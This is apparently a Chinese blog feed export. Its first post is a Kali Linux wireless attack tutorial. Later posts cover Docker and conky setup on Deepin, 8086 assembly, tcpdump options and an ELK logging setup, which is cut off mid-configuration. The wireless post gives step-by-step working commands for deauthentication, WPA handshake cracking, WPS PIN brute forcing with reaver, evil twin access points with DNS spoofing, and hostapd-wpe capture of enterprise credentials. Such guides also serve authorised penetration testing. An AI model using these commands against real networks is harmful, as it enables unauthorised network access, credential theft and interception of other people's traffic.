启动monitor 1234 service network-manager stopairmon-ng check killairmon-ng start wlan0 11 # 设置无线网卡与`AP`处于同一信道airodump-ng wlan0mon -c 11 --bssid 00:00:00:00:00:00 -w wpa 抓包并保存 Deauthentication攻击获取四步握手信息 1aireplay-ng -0 1 -a 00:00:00:00:00:00 -c 11:11:11:11:11:11 wlan0mon 使用字典进行暴力破解 123aircrack-ng -w a.txt wpa-01.cap-w：指定密码字典 无AP时WPA密码破解当攻击者远离AP，但接近STATION，或者无AP时。 正常情况下，STATION在连接AP时，会向周围网络中发送数据包，探测STATION曾经连接过的AP是否在范围内，如果在，则自动进行连接。 这时，STATION会向周边网络透露无线连接信息，通过抓包可以掌握AP的名称等信息，以这些信息来伪造此AP；若加密方式相同，STATION会连接此伪造AP，通过抓取此连接过程四步握手中的前两步进行破解 启动monitor 开始抓包并保存 根据probe信息伪造相同ESSID的AP 1234567airbase-ng --essid xxx -c 11 wlan0mon--essid：设置伪造AP的名称-c：设置伪造AP的工作信道-w：表示使用WEP加密方式，默认为open认证方式-z：表示使用WPA1加密方式，-z 2为TKIP方式-Z：表示使用WPA2加密方式，-Z 4为CCMP方式 抓取四步握手中的前两个包 使用字典进行暴力破解 ESSID+PSK+迭代4096次，通过HASH计算生成PMK PMK+两个随机数+AP的MAC地址+STATION的MAC地址，通过HMAC-SHA1散列算法或PRF-X散列算法生成PTK 此时通过字典暴力破解PSK，通过不断与STATION尝试连接即可 1aircrack-ng -w a.txt wpa-01.cap 提高WPA攻击效率工具WPA攻击中，抓取数据包并不是攻击中的难点，难点在于抓取数据包后使用字典密码破解的过程 AIROLIB破解密码设计用于存储ESSID和密码列表，使用SQLite3存储数据 AIROLIB首先结合ESSID以及密码列表，通过计算生成PMK存储于数据库，此过程会消耗大量资源 在真正破解阶段，AIROLIB会直接使用已经生成好的PMK来生成PTK，之后通过完整性校验来破解密码，此过程速度快，且资源消耗较少，以此来提高破解速度 生成PMK 12345echo kifi &gt; essid.txt # 将要破解AP的ESSID存于文件中airolib-ng db --import essid essid.txt # 创建名为db的数据库并导入ESSIDairolib-ng db --stats # 查看数据库状态airolib-ng db --import passwd a.txt # 向数据库中导入密码，此时会自动筛选剔除不符合密码策略的密码airolib-ng db --batch # 生成PMK 破解密码 1aircrack-ng -r db wpa-01.cap JTR破解密码John the ripper 支持规则扩展密码字典，避免存储大容量字典文件 获取地区手机号段，使用JTR动态增加号段后四位，实现破解 修改John the ripper配置文件 1234vim /etc/john/john.conf[List.Rules:Wordlist]$[0-9]$[0-9]$[0-9]$[0-9] 生成字典测试 1john --wordlist=yd.txt --rules --stdout 破解调用 1john --wordlist=yd.txt --rules --stdout | aircrack-ng -e kifi -w - wpa-01.cap COWPATTY破解密码WPA密码通用破解工具 使用密码字典进行破解 12345 cowpatty -r wpa-01.cap -f a.txt -s ESSID-r：指定抓包文件-f：指定密码字典-s：指定要破解AP的ESSID 使用PMK彩虹表 生成彩虹表 12345genpmk -f a.txt -d pmkhash -s ESSID -f：指定密码字典-d：指定生成的彩虹表存储的位置-s：指定要破解AP的ESSID 使用生成的彩虹表破解密码 12345cowpatty -r wpa-01.cap -d pmkhash -s ESSID -r：指定抓包文件-d：指定使用的彩虹表-s：指定要破解AP的ESSID PYRIT破解密码与AIROLIB、COWPATTY相同，支持基于预计算PMK的方式来提高破解速度 优势： pyrit除CPU外，可以利用GPU计算能力加速生成PMK 本身支持抓包可获取四步握手，无需使用airodump抓包 也支持传统的读取airodump抓包获取四步握手的方式 使用pyrit抓取WPA四步握手12345pyrit -r wlan0mon -o wpapyrit.cap stripLive-r：指定抓包网卡-o：指定输出文件stripLive：表示剔除无用数据包 分析pyrit所抓取的四步握手数据包1234pyrit -r wpapyrit.cap analyze-r：指定所抓取的文件analyze：表示进行分析 使用airodump抓取的数据包，导入pyrit并筛选12345pyrit -r wpa-01.cap -o wpapyrit.cap strip-r：指定由airodump抓取的数据包-o：指定进行筛选后的输出文件strip：表示进行数据包筛选 使用密码字典直接破解123456pyrit -r wpapyrit.cap -i a.txt -b 00:00:00:00:00:00 attack_passthrough-r：指定所抓取的文件-i：指定使用的密码字典-b：指定AP的MAC地址attack_passthrough：表示进行密码字典破解 数据库模式破解默认使用基于文件的数据库，支持连接SQL数据库，用于存储计算的PMK 查看默认数据库的状态 1pyrit eval 导入密码字典，同时会剔除不合规的密码 1pyrit -i a.txt import_passwords 指定ESSID 1pyrit -e ESSID create_essid 计算PMK（使用GPU资源） 1pyrit batch 使用PMK彩虹表破解密码 12345pyrit -r wpapyrit.cap -b 00:00:00:00:00:00 attack_db-r：指定抓包文件-b：指定要破解AP的MAC地址attack_db：表示使用彩虹表进行破解 WPS攻击WIRELESS PROTECTED SETUP WPS是WiFi联盟2006年开发的一项技术 通过PIN码来简化无线接入的操作，无需记住PSK 路由器与网卡各按一个按钮就可接入无线 PIN码分为前后各4位的两段，共8位数字 安全漏洞 2011年发现存在安全漏洞 接入发起方可以根据路由器的返回信息判断PIN前4位是否正确 PIN码的后4位只有1000种定义的组合(最后一位为校验值) 全部穷举破解测试只需要11000次尝试，破解PIN后，即可读取到PSK 标准本身没有设计多次尝试锁定机制，目前多个厂商已实现锁定机制 包括Linksys在内的很多厂家的无线路由器无法关闭WPS功能，即使在WEB界面中有关闭WPS按钮，配置也不会生效 攻击难度相对较低，防御却十分困难 一般可在4-10小时内爆破出PSK 攻击过程 启动侦听模式后，发现支持WPS技术的AP 12345wash -C -i -c 11 wlan0mon-C：忽略错误帧的报警-i：指定侦听网卡-c：指定工作信道 或 1airodump-ng wlan0mon --wps 爆破PIN码 默认每分钟发送10次PIN码，防止触发锁定机制 一旦触发锁定机制，可尝试耗尽AP连接数，令其重启并解除WPS锁定 1234567reaver -i wlan0mon -b 00:00:00:00:00:00 -vv -c 11-i：指定使用的无线网卡-b：指定要爆破的AP-vv：显示更加详细的信息-c：指定工作信道-d：指定每发送一次PIN码的延迟时间(秒) 秒破PIN码 123reaver -i wlan0mon -b 00:00:00:00:00:00 -vv -K 1-K 1：调用pixiewps命令秒级破解PIN，只针对于固定厂商的芯片，成功率较低 获取PSK 123reaver -i wlan0mon -b 00:00:00:00:00:00 -vv -p PIN-p：指定已破解的PIN，用于获取PSK 综合自动化无线密码破解工具wifite EVIL TWIN AP/ROGUE AP 启动无线网卡侦听模式 伪造AP 123airbase-ng -c 11 --essid kifi-free wlan0mon-a：指定真实AP的MAC地址，利于完全伪造AP 安装网卡桥接工具包，使连接伪造AP的客户端与局域网内其他有线设备处于同一网络，可以连接互联网 1apt-get install bridge-utils 设置网桥 1234567brctl addbr bridge # 添加网桥接口bridgebrctl addif bridge eth0 # 添加网络接口至网桥中brctl addif bridge at0 # 添加网络接口至网桥中ifconfig eth0 0.0.0.0 up # 将网桥两端网络接口IP抹掉ifconfig at0 0.0.0.0 upifconfig bridge 10.1.1.101 up # 将网桥激活route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.1.1.1 # 添加网关，使客户端连接真实路由获取IP地址 启动IP转发 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward DNS欺骗 1234dnsspoof -i bridge -f host-i：指定要欺骗的网络接口，所有经过此网络接口的流量都会进行DNS欺骗-f：指定要进行DNS欺骗的IP、域名对应关系文件 被攻击者连接伪造AP 3vilTwinAttacker下载安装 123456git clone https://github.com/P0cL4bs/3vilTwinAttacker.gitcd 3vilTwinAttacker/dpkg -i isc-dhcp-server_4.3.1-6_amd64.debcd 3vilTwinAttacker/chmod +x installer.sh./installer.sh --install 映射无线网卡至虚拟机，无需配置无线网卡 启动 13vilTwin-Attacker 设置3vilTwinAttacker的iptables规则 123删除2，3，4，5条规则增加iptables -t nat -A POSTROUTING -O eth0 -j MASQUERADE WPA企业攻击hostapd-wpehostapd-wpe为hostapd的补丁，用于完善功能，需基于hostapd使用 下载安装 123456789101112git clone https://github.com/OpenSecurityResearch/hostapd-wpeapt-get install libssl-devwget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl-dev_1.1-7_amd64.debwget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl1_1.1-7_amd64.debdpkg -i libnl1_1.1-7_amd64.debdpkg -i libnl-dev_1.1-7_amd64.debwget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gztar -zxf hostapd-2.2.tar.gzcd hostapd-2.2patch -p1 &lt; ../hostapd-wpe/hostapd-wpe.patchcd hostapdmake 生成证书 12cd ../../hostapd-wpe/certs./bootstrap 修改配置文件 123456789101112cd hostapd-2.2/hostapd/vim hostapd-wpe.conf# interface=eth0interface=wlan0 # 指定无线网卡# driver=wireddriver=nl80211 # 指定无线网卡驱动ssid=kifihw_mode=gchannel=11 运行 12service network-manager stopairmon-ng check kill 映射无线网卡 启动无线网卡 1ifconfig wlan0 up 启动伪造AP 12cd hostapd-2.2/hostapd/./hostapd-wpe hostapd-wpe.conf 当客户端连接伪造AP，输入用户名密码进行身份认证时，hostapd-wpe会抓取username、challenge、response 密码破解 12345asleap -C challenge -R response -W a.txt-C：指定challenge的值-R：指定response的值-W：指定字典 aircrack-ng suite其他工具airdecap-ng去除802.11头 1airdecap-ng -b &lt;AP MAC&gt; 1.cap 解密WEP加密数据 1airdecap-ng -w &lt;WEP KEY&gt; -b &lt;AP MAC&gt; 1.cap 解密WEP必须有与AP建立关联关系 解密WPA加密数据 1airdecap-ng -e kifi -p &lt;PSK&gt; -b &lt;AP MAC&gt; 1.cap 解密WPA抓包文件中必须包含四步握手信息，否则无解 airserv-ng通过网络提供无线网卡服务器 某些网卡不支持客户端/服务器模式 某些防火墙会影响C/S间的通信 服务器端启动无线网卡侦听 启动服务器端 123airserv-ng -p 3333 -d wlan0mon-p：指定服务器端开放端口，默认为666端口 启动客户端 123airodump-ng IP:PORT此时会侦听服务器端无线网络范围的流量 airtun-ng 无线入侵检测系统(wIDS) 需要无线密码和BSSID、获取握手信息 中继和重放(Repeate/Replay) 无线信号中继、流量数据包重放 wIDS用作wIDS的终端需要靠近AP与客户端 当进行wIDS时，AP与客户端所有的通信流量都会被wIDS抓取到，解密进行分析 理论上一个无线网卡支持多AP的wIDS，但2个AP以上时可靠性会下降 WEP1airtun-ng -a &lt;AP MAC&gt; -w &lt;WEP KEY&gt; wlan0mon WPA12airtun-ng -a &lt;AP MAC&gt; -p PSK -e kifi wlan0monifconfig at0 up # at0会接收AP与其客户端的所有流量 可以在at0后部署入侵检测系统，实时查看分析流量，也可以将流量数据包保存为.pcap,异地进行重放、分析、查看 Repeate扩展无线侦听的距离 要求两块网卡都置为monitor模式 其中一块无线网卡用于收取无线信号，通过另一块无线网卡向另一个方向传输无线信号 12345airtun-ng -a &lt;AP MAC&gt; --repeat --bssid &lt;AP MAC&gt; -i wlan0mon wlan1mon-a：另一块网卡发包的源地址，即侦听AP的MAC地址--bssid：抓包可能会抓取多个AP的数据包，此参数用于过滤只发指定源地址的包(可选)-i：指定收包的无线网卡 Replay将抓取的cap文件重放到指定网卡 1234airtun-ng -a &lt;AP MAC&gt; -r 1.cap &lt;interface&gt;-a：发包的源地址&lt;interface&gt;：指定用于接收重放的无线网卡接口 其他工具bessid-ng对AP与STATION做Deauthentication攻击，抓取四步握手信息，只针对WPA加密方式 12-b：指定AP的BSSID-s：将抓取的四步握手cap文件上传至其服务器(wpa.darkircop.org)，自动做密码破解 Fern WIFI Cracker基于Aircrack-ng实现的图形化工具 无线侦察kismet嗅探无线网络工具Kismet。使用该工具可以测量周围的无线信号，并查看所有可用的无线接入点 kismet联动结合GPS模块，可生成AP物理坐标，通过转换可将坐标导入谷歌地球，实现无线侦察 当前目录下会生成以kismet开头的文件 Kismet-time.nettxt保存已侦察到的AP的相关信息 Kismet-time.netxml保存已侦察到的AP信息与其GPS信息 GPS模块安装gspd 1apt-get install gpsd gpsd-clients 将GPS硬件模块映射 kill原有gpsd进程 将GPS模块映射后，通过dmesg查看设备文件名称 获取定位信息 123456 gpsd -n -N -D4 /dev/ttyUSB0-n：自动启动GPS模块-N：前台运行-D4：查看debug信息，4等级(最高等级5)/dev/ttyUSB0：GSP模块的设备文件名称 无线侦察,kismet会调用gpsd，对应AP信息与GPS信息 1kismet 将.netxml存有AP信息与GPS信息的文件进行处理，存储于giskismet的数据库 123giskismet -x Kismet-time.netxml -x：表示要处理xml格式文件 从giskismet的数据库中查询 1234giskismet -q &quot;select * from wireless&quot; -o gps.kml-q：指定查询语句-o：指定输出文件 Google地球下载安装kali64位版本 1234http://dl.google.com/dl/earth/client/current/google-earth-stable_current_amd64.debdpkg -i google-earth64.debapt-get -f install # 安装google-earth所需依赖包]]></content>
      <categories>
        <category>Kali Linux渗透测试</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[deepin]]></title>
    <url>%2F2018%2F11%2F24%2Fdeepin%2F</url>
    <content type="text"><![CDATA[deepindocker卸载原版本1sudo apt-get remove docker docker-engine 安装docker-ce和密钥管理以及下载相关的工具1sudo apt-get install apt-transport-https ca-certificates curl python-software-properties software-properties-common 下载并安装密钥1curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - 查看秘钥是否安装成功1sudo apt-key fingerprint 0EBFCD88 若安装成功，显示如下内容 1234pub 4096R/0EBFCD88 2017-02-22 Key fingerprint = 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88uid Docker Release (CE deb) &lt;docker@docker.com&gt;sub 4096R/F273FCD8 2017-02-22 添加docker仓库1sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/debian wheezy stable&quot; 更新仓库1sudo apt-get update 安装docker-ce1sudo apt-get install docker-ce 启动docker-ce1systemctl start docker 设置docker非root用户普通用户登入会出现报错 1Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.35/version: dial unix /var/run/docker.sock: connect: permission denied 查看是否有docker用户组 1cat /etc/group | grep docker 若无，创建 1sudo groupadd -g 999 docker 将当前用户加入用户组 1sudo gpasswd -a $&#123;USER&#125; docker 查看docker.scok文件权限 12cd /var/runls -l | grep docker. 可以看到其属主为root，权限为rw，可读可写；其属组为docker，权限为rw，可读可写。如果要当前用户可直接读取该文件，那么就把当前用户添加到docker属组即可。 修改docker.sock权限 1sudo chmod a+rw /var/run/docker.sock 验证 1docker run hello-world 换源阿里云 在阿里云申请一个账号 打开连接 https://cr.console.aliyun.com/#/accelerator 拷贝您的专属加速器地址。 修改修改daemon配置文件/etc/docker/daemon.json来使用加速器(下面是4个命令，分别单独执行) 注意：这里的https://jxus37ad.mirror.aliyuncs.com是申请者的加速器地址，在此仅仅用于演示，而使用者要个根据自己的使用的情况填写自己申请的加速器地址。 12345678sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;&#123; &quot;registry-mirrors&quot;: [&quot;https://jxus37ad.mirror.aliyuncs.com&quot;]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker 使用docker-cn提供的镜像源 编辑/etc/docker/daemon.json文件，并输入docker-cn镜像源地址 1sudo nano /etc/docker/daemon.json 输入以下内容 12345&#123; &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;] &#125; 重启docker服务 1sudo service docker restart 禁止开机启动默认情况下Docker是开机自启的，如果我们想禁用开机自启，可以通过安装chkconfig命令来管理Deepin自启项 12345# 安装chkconfigsudo apt-get install chkconfig # 移除自启sudo chkconfig --del docker 参考链接https://blog.csdn.net/qq_36148847/article/details/79273591 conky安装conky-manager应用商店 主题.shuxun2放入家目录下的.conky目录中 conky-manager中选择.shuxun2 问题１. CPU温度不显示 1sudo apt-get install lm-sensors 问题２. 网络流量不显示 1ifconfig 查看网卡名称 修改.shuxun2文件 123456网络使用: 下载速度:$alignr$&#123;downspeed 网卡名称&#125; k/s上传速度:$alignr$&#123;upspeed 网卡名称&#125; k/sd $&#123;downspeedgraph 网卡名称 324D23 77B753&#125; 设置自启conky-manager中设置自启 参考链接https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=36296&amp;extra= kali添加kali官方源1234sudo vim /etc/apt/sources.listdeb http://http.kali.org/kali kali-rolling main contrib non-freedeb-src http://http.kali.org/kali kali-rolling main contrib non-free 更新应用列表 1sudo apt update 出现错误 1234W: GPG 错误：https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY ED444FF07D8D0BF6W: 仓库 “https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling InRelease” 没有数字签名。N: 无法认证来自该源的数据，所以使用它会带来潜在风险。N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。 解决方法 添加DNS地址 123vim /etc/resolve.conf nameserver 114.114.114.114 导入公钥 1sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 7D8D0BF6 即可更新应用列表 参考链接http://www.storysec.com/deepin-for-penetration.html https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=143308]]></content>
      <categories>
        <category>Linux桌面优化与美化</category>
      </categories>
      <tags>
        <tag>Linux桌面</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-寄存器(内存访问)]]></title>
    <url>%2F2018%2F10%2F18%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E5%AF%84%E5%AD%98%E5%99%A8-%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[内存中字的存储CPU中，用16位寄存器来存储一个字，高8位存放高位字节，低8位存放低位字节 内存中，一个内存单元存放一个字节，一个字则需要两个地址连续的内存单元来存放。字的低位字节存放在低地址单元中，高位字节存放在高地址单元中 0和1两个内存单元中存放数据4E20H 2和3两个内存单元中存放数据0012H 字单元存放一个字型数据(16位)的内存单元，由两个地址连续的内存单元组成。高地址内存单元中存放字型数据的高位字节，低地址内存单元中存放字型数据的低位字节 如上图 0地址单元中的字节型数据是20H 0地址字单元中存放的字型数据是4E20H 1地址字单元中存放的字型数据位124EH 由此可知，任何两个地址连续的内存单元，N号单元和N+1号单元，可以将它们看成两个内存单元，也可以看成一个地址为N的字单元中的低位字节单元和高位字节单元 DS和[address]CPU要读写一个内存单元时，需首先给出这个内存单元的地址。 在8086PC中，内存地址由段地址和偏移地址组成 8086CPU中，DS寄存器用于存放要访问的数据的段地址 例：读取10000H内存单元的内容至al中 123mov bx,1000Hmov ds,bxmov al,[0] 123mov al,[0]格式：mov 寄存器名，内存单元地址 [...]表示一个内存单元，[...]中的0表示内存单元的偏移地址 在读取内存的指令执行时，8086CPU将自动取DS中的数据为内存单元的段地址，结合[...]中的偏移地址形成内存物理地址，即可将内存单元中的数据读取出来存到al中 8086CPU不支持将数据直接送入段寄存器的操作，只可用一个寄存器进行中转，即先将段地址送入通用寄存器，再由通用寄存器送入段寄存器 例：将al中的数据送入内存单元10000H中 123mov bx,1000Hmov ds,bxmov [0],al 123mov [0],al格式：mov 内存单元地址，寄存器名 字的传送8086CPU是16位结构，有16根数据线，可一次性传送16位的数据，即一个字 MOV,ADD,SUB指令MOV指令12345678mov 寄存器,数据 mov ax,8mov 寄存器,寄存器 mov ax,bxmov 寄存器,内存单元 mov ax,[0]mov 内存单元,寄存器 mov [0],axmov 段寄存器,寄存器 mov ds,axmov 寄存器,段寄存器 mov ax,dsmov 内存单元,段寄存器 mov [0],csmov 段寄存器,内存单元 mov ds,[0] 1mov 段寄存器,内存单元 ADD指令1234add 寄存器,数据 add ax,8add 寄存器,寄存器 add ax,bxadd 寄存器,内存单元 add ax,[0]add 内存单元,寄存器 add [0],ax SUB指令减法指令 sub ax,9含义：用ax中的值减去9后保存到ax中 1234sub 寄存器,数据 sub ax,9sub 寄存器,寄存器 sub ax,bxsub 寄存器,内存单元 sub ax,[0]sub 内存单元,寄存器 sub [0],ax 数据段可以将一组长度为N(N&lt;=64KB)，地址连续，起始地址为16的倍数的内存单元当作专门存储数据的内存空间，从而定义了一个数据段 定义数据段 操作数据段 12345mov ax,123BHmov ds,axmov al,[0]mov al,[1]mov al,[2] 栈具有特殊访问方式的存储空间 基本操作：入栈，出栈 操作规则：LIFO(后进先出) CPU提供的栈机制8086CPU提供相关的指令来以栈的方式访问内存空间，即可以将一段内存当作栈来使用 12345push ;入栈pop ;出栈push ax ;将ax中的数据送入栈中pop ax ;从栈顶取出数据送入ax 8086CPU的入栈与出栈操作以字为单位进行 CPU如何知道栈顶的位置8086CPU中，有两个寄存器，段寄存器SS和寄存器SP SS存放栈顶的段地址 SP存放栈顶的偏移地址 任意时刻，SS:SP指向栈顶元素 push指令和pop指令执行时，CPU从SS和SP中得到栈顶地址 不可直接向段寄存器SS送入数据，需使用通用寄存器中转 PUSH ax指令 SP=SP-2,SS:SP指向当前栈顶上方内存单元，此单元为新的栈顶 将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新的栈顶 8086CPU中，入栈时，栈顶从高地址向低地址方向增长 POP ax指令 将SS:SP指向的内存单元处的数据送入ax中 SP=SP+2,SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶 当栈顶数据执行了出栈操作，此数据并未在栈中删除，但其已经不存在于栈中了，因栈顶的地址是由SS:SP确定的，当其他数据执行入栈操作时，可覆盖已出栈的数据 栈空 任意时刻，SS:SP指向栈顶元素，当栈为空时，栈中没有元素，也就不存在栈顶元素，所以SS:SP只能指向栈的最底部单元下面的单元，该单元的偏移地址为栈最底部的字单元的偏移地址+2 栈顶超界问题栈满超界 栈空超界 8086CPU无法提供任何机制判断对栈的操作是否超界。8086CPU只考虑当前的情况：当前的栈顶在何处、当前要执行的指令是哪一条。 所以只能靠程序员编程时注意出栈，入栈的栈的超界问题。 push、pop指令push和pop指令可以在寄存器和内存之间传送数据 格式： 12345678push 寄存器 ;寄存器数据入栈pop 寄存器 ;出栈至寄存器push 段寄存器 ;段寄存器数据入栈pop 段寄存器 ;出栈至段寄存器push 内存单元 ;内存字单元数据入栈(栈操作以字为单位)pop 内存单元 ;出栈至内存字单元 push指令与pop指令实质上是一种内存传送指令 栈段将长度为N(N&lt;=64KB)的一组地址连续，起始地址为16的倍数的内存单元，当作栈空间来使用，从而定义了一个栈段 将一段内存当作栈段，是程序员行为，CPU不会识别栈段，想要栈操作指令可以访问自定义的栈段，需将SS:SP指向自定义栈段 用机器指令和汇编指令编程Debug的使用D命令d 段地址:偏移地址语句查看指定内存单元的内容 d 段寄存器:偏移地址，以段寄存器中的数据为段地址SA，列出从SA:偏移地址开始的内存区间中的数据 例: 12345-r ds:1000-d ds:0查看从1000:0开始的内存区间中的内容 12345-r ds:1000-d ds:10 18查看1000:10-1000:18中的内容 123-d cs:0查看当前代码段中的指令代码 123-d ss:0查看当前栈段中的内容 在E、A、U命令中使用段寄存器同D命令相同，使用段寄存器表示内存单元的段地址 例： 12345-r ds:1000-e ds:0 11 22 33 44 55 66在从1000:0开始的内存区间中写入数据 123-u cs:0以汇编指令的形式，显示当前代码段中的代码 12345-r ds:1000-a ds:0以汇编指令的形式，向1000:0开始的内存单元中写入指令 下一条指令执行了吗？在debug中，用A命令写一段程序 1234567mov ax,2000mov ss,axmov sp,10 ;将2000:0000-2000:000F为栈空间，初始化栈顶mov ax,3123push axmov ax,3366push ax ;向栈中压入两个数据 当使用T命令进行单步运行时，mov sp,10未执行，但是寄存器sp的值已经修改，说明mov sp,10在mov ss,ax之后紧接着执行了 结论：Debug的T命令在执行修改寄存器SS的指令时，下一条指令也紧接着执行了，这属于中断机制]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tcpdump]]></title>
    <url>%2F2018%2F09%2F17%2Ftcpdump%2F</url>
    <content type="text"><![CDATA[tcpdumptcpdump的输出格式为：系统时间 来源主机.端口 &gt; 目标主机.端口 数据包参数 在内核中取消bpfilter支持，就能屏蔽tcpdump之类的网络分析工具。 参数不带任何参数的TcpDump将搜索系统中第一个网络接口，并显示它截获的所有数据 tcpdump采用命令行方式，它的命令格式为： 123tcpdump [ -adeflnNOpqStvx ] [ -c 数量 ] [ -F 文件名 ][ -i 网络接口 ] [ -r 输入数据包文件名] [ -s snaplen ][ -T 类型 ] [ -w 输出数据包文件名 ] [表达式 ] 12345678910111213141516171819202122-a 将网络地址和广播地址转变成名字-b 在网络层上选择协议，包括ip、arp、rarp、ipx都是这一层的-d 将匹配信息包的代码以人们能够理解的汇编格式给出-dd 将匹配信息包的代码以c语言程序段的格式给出-ddd 将匹配信息包的代码以十进制的形式给出-e 在输出行打印出数据链路层的头部信息-f 将外部的Internet地址以数字的形式打印出来-l 使标准输出变为缓冲行形式-n 不把网络地址转换成名字-N 不打印出默认的域名-nn 不进行端口名称的转换-O 不进行匹配代码的优化-t 在输出的每一行不打印时间戳-tt 打印原始的、未格式化过的时间-v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息-vv 输出详细的报文信息-c 在收到指定的包的数目后，tcpdump就会停止-F 从指定的文件中读取表达式,忽略其它的表达式-i 指定监听的网络接口-r 从指定的文件中读取包(这些包一般通过-w选项产生)-w 直接将包写入文件中，并不分析和打印出来-T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc （远程过程调用）和snmp（简单 网络管理协议） 表达式关于类型的关键字(缺省的类型是host)123host：指明主机net：指明网络port：指明端口 确定传输方向的关键字(缺省是src or dst关键字)1234src：指明源地址dst：指明目的地址dst or srcdst and src 关于协议的关键字(默认监听所有协议的信息包)123456fddi：指明是在FDDI(分布式光纤数据接口网络)上的特定的网络协议ip：arp：rarp：tcp：udp： 逻辑运算123取非运算：not ,! 与运算：and,&amp;&amp;或运算：or,|| gateway：指明网关 broadcast：指明广播地址 less greater]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[日志分析ELK]]></title>
    <url>%2F2018%2F09%2F17%2F%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90ELK%2F</url>
    <content type="text"><![CDATA[大多数Linux发行版默认的日志守护进程为rsyslog 开发语言的warning（警告级别）可以不用查 系统及服务的warning（警告级别）必须查 ELKE：搜索引擎，存放数据 L：安装于服务器中，将各个服务器中的日志存于E中 K：用于显示 用处收集文件，收集正则方式，收集json 全文索引 实时分析 处理PB级结构化或非结构化数据 ELK配置（本机IP：192.168.199.103）elasticsearch-5.6.8配置(ES) 配置jdk，jdk环境变量 确保安装java1.8以上版本 解压java-jdk 1tar zxvf jdk-8u171-linux-x64.tar.gz /data/server/ 设置环境变量 12345vim /etc/profile export JAVA_HOME=/data/server/jdk1.8.0_171export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JAVA_HOME/jre/lib/rt.jarexport PATH=$PATH:$JAVA_HOME/bin 使/etc/profile生效 1source /etc/profile 解压elasticsearch-5.6.8.tar.gz包并执行安装 123mv elasticsearch-5.6.8/ /data/servercd /data/server/elasticsearch-5.6.8/bin/./elasticsearch 错误一：不能以root用户执行 12useradd elaschown -R elas.elas elasticsearch-5.6.8/ 错误二：文件描述符 12echo fs.file-max=65536 &gt;&gt; /etc/sysctl.confsysctl -p 错误三：虚拟内存数 12echo vm.max_map_count=655360 &gt;&gt; /etc/sysctl.confsysctl -p 错误四：JVM heap size 12vim /data/server/elasticsearch-5.6.8/config/jvm.options更改 -Xms2g与-Xmx2g 验证安装 1curl http://127.0.0.1:9200 logstash-5.6.10配置 解压logstash-5.6.10.tar.gz包 1mv logstash-5.6.10/ /data/server/ 修改elasticsearch配置文件 123456vim /data/server/elasticsearch-5.6.8/config/elastic search.yml cluster.name: my-applicationnode.name: node-1network.host: 192.168.199.103http.port: 9200 验证：浏览器访问http://192.168.199.103:9200 配置远程日志服务器 123vim /etc/rsyslog.conf *.* @192.168.199.103:5000 编写logstash配置文件.conf 12345678910111213141516171819202122cd /data/logger/vim logstash.conf input &#123; tcp &#123; port =&gt; 5000 type =&gt; syslog #可选 &#125; udp &#123; port =&gt; 5000 type =&gt; syslog &#125;&#125;output &#123; elasticsearch &#123; hosts =&gt; [&quot;192.168.199.103:9200&quot;] index =&gt; &quot;ad&quot; #索引，用于kibana建立实例时使用 &#125; stdout &#123; codec =&gt; rubydebug &#125;&#125; 启动ES 12cd /data/server/elasticsearch-5.6.8/bin/./elasticsearch 启动logstash 12cd /data/server/logstash-5.6.10/bin/./logstash -f /data/logger/logstash.conf 验证 12logger -i -s &quot;asdasd&quot; #产生日志logstash 中产生日志记录 kibana-5.6.8配置（版本与ES相同） 解包 123tar xvf kibana-5.6.8-linux-x86_64.tar.gzmv kibana-5.6.8-linux-x86_64 /data/server/cd /data/server/kibana-5.6.8-linux-x86_64 更改配置文件 12345678vim config/kibana.yml server.port: 5601server.host: &quot;192.168.199.103&quot;elasticsearch.url: &quot;http://192.168.199.177:9200&quot;kibana.index: &quot;.kibana&quot;elasticsearch.username: &quot;elastic&quot;elasticsearch.password: &quot;changeme&quot; 启动 首先启动ES，logstash 然后启动kibana 12cd /data/server/kibana-5.6.8-linux-x86_64/bin./kibana 验证安装 访问http://192.168.199.103:5601 安装x-pack插件 下载 版本与ES和kibana相同 安装 安装ES部分 12cd /data/server/elasticsearch-5.6.8/bin./elasticsearch-plugin install file:////usr/local/src/x-pack-5.6.10.zip 安装kibana部分 12cd /data/server/kibana-5.6.8-linux-x86_64/bin./kibana-plugin install file:////usr/local/src/x-pack-5.6.10.zip 修改logstash.conf 添加x-pack身份验证 12345678910 output &#123; elasticsearch &#123; hosts =&gt; [&quot;192.168.199.103:9200&quot;] user =&gt; elastic password =&gt; 